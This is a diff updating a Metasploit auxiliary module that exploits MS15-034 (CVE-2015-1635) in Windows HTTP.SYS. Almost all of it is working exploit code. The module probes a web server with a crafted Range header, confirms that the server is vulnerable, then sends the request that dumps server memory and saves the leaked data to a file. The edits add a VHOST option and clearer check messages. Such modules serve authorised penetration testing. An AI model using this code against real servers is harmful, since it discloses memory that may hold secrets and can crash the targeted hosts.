@@ -1,51 +1,53 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'rex/proto/http'
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure',
-      'Description' => %q{
-        This module dumps memory contents using a crafted Range header and affects only
-        Windows 8.1, Server 2012, and Server 2012R2. Note that if the target
-        is running in VMware Workstation, this module has a high likelihood
-        of resulting in BSOD; however, VMware ESX and non-virtualized hosts
-        seem stable. Using a larger target file should result in more memory
-        being dumped, and SSL seems to produce more data as well.
-      },
-      'Author'      =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure',
+        'Description' => %q{
+          This module dumps memory contents using a crafted Range header and affects only
+          Windows 8.1, Server 2012, and Server 2012R2. Note that if the target
+          is running in VMware Workstation, this module has a high likelihood
+          of resulting in BSOD; however, VMware ESX and non-virtualized hosts
+          seem stable. Using a larger target file should result in more memory
+          being dumped, and SSL seems to produce more data as well.
+        },
+        'Author' => [
           'Rich Whitcroft <rwhitcroft[at]gmail.com>', # Msf module
-          'sinn3r'                                    # Some more Metasploit stuff
+          'sinn3r', # Some more Metasploit stuff
+          'Sunny Neo <sunny.neo[at]centurioninfosec.sg>' # Added VHOST option
+
         ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2015-1635'],
           ['MSB', 'MS15-034'],
-          ['URL', 'http://pastebin.com/ypURDPc4'],
+          ['URL', 'https://pastebin.com/ypURDPc4'],
           ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150'],
           ['URL', 'https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection'],
           ['URL', 'http://www.securitysift.com/an-analysis-of-ms15-034/'],
           ['URL', 'http://securitysift.com/an-analysis-of-ms15-034/']
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
       OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/']),
       OptBool.new('SUPPRESS_REQUEST', [ true, 'Suppress output of the requested resource', true ])
-    ], self.class)
-
-    deregister_options('VHOST')
+    ])
   end
 
   def potential_static_files_uris
@@ -54,19 +56,21 @@ class MetasploitModule < Msf::Auxiliary
     return [uri] unless uri[-1, 1] == '/'
 
     uris = ["#{uri}iisstart.htm", "#{uri}iis-85.png", "#{uri}welcome.png"]
-    res  = send_request_raw('uri' => uri)
+    res = send_request_raw('uri' => uri)
 
     return uris unless res
 
     site_uri = URI.parse(full_uri)
-    page     = Nokogiri::HTML(res.body.encode('UTF-8', invalid: :replace, undef: :replace))
+    page = Nokogiri::HTML(res.body.encode('UTF-8', invalid: :replace, undef: :replace))
 
     page.xpath('//link|//script|//style|//img').each do |tag|
       %w(href src).each do |attribute|
         attr_value = tag[attribute]
         next unless attr_value && !attr_value.empty?
-        uri = site_uri.merge(URI.encode(attr_value.strip))
+
+        uri = site_uri.merge(URI::DEFAULT_PARSER.escape(attr_value.strip))
         next unless uri.host == vhost || uri.host == rhost
+
         uris << uri.path if uri.path =~ /\.[a-z]{2,}$/i # Only keep path with a file
       end
     end
@@ -95,13 +99,13 @@ class MetasploitModule < Msf::Auxiliary
         # Save the file that we want to use for the information leak
         target_uri.path = uri
 
-        return Exploit::CheckCode::Vulnerable
+        return Exploit::CheckCode::Vulnerable("#{uri} returned 'Requested Range Not Satisfiable', indicating HTTP.SYS is vulnerable to MS15-034.")
       elsif res && res.body.include?('The request has an invalid header name')
-        return Exploit::CheckCode::Safe
+        return Exploit::CheckCode::Safe('Server rejected the crafted Range header, indicating it is not vulnerable to MS15-034.')
       end
     end
 
-    Exploit::CheckCode::Unknown
+    Exploit::CheckCode::Unknown('Could not determine vulnerability status. No static file returned a definitive response.')
   end
 
   def dump(data)
@@ -109,7 +113,7 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['SUPPRESS_REQUEST']
       dump_start = data.index('HTTP/1.1 200 OK')
       if dump_start
-        data[0..dump_start-1] = ''
+        data[0..dump_start - 1] = ''
       else
         print_error("Memory dump start position not found, dumping all data instead")
       end
@@ -163,11 +167,19 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     begin
-      unless check_host(ip)
-        print_error("Target is not vulnerable")
+      vuln_status = check_host(ip)
+      case vuln_status
+      when Exploit::CheckCode::Safe
+        print_error('The target is not exploitable.')
         return
+      when Exploit::CheckCode::Unknown
+        print_error('Cannot reliably check exploitability! Observe the traffic with HTTPTrace turned on and try to debug.')
+        return
+      when Exploit::CheckCode::Vulnerable
+        print_good('The target is vulnerable.')
       else
-        print_good("Target may be vulnerable...")
+        print_error('An unknown status code was returned from check_host!')
+        return
       end
 
       content_length = get_file_size
@@ -188,8 +200,9 @@ class MetasploitModule < Msf::Auxiliary
       req = cli.request_raw(
         'uri' => target_uri.path,
         'method' => 'GET',
+        'vhost' => "#{datastore['VHOST']}",
         'headers' => {
-        'Range' => ranges
+          'Range' => ranges
         }
       )
       cli.send_request(req)
@@ -201,7 +214,7 @@ class MetasploitModule < Msf::Auxiliary
       if resp
         dump(resp.to_s)
         loot_path = store_loot('iis.ms15034', 'application/octet-stream', ip, resp, nil, 'MS15-034 HTTP.SYS Memory Dump')
-        print_status("Memory dump saved to #{loot_path}")
+        print_good("Memory dump saved to #{loot_path}")
       else
         print_error("Disclosure unsuccessful (must be 8.1, 2012, or 2012R2)")
       end
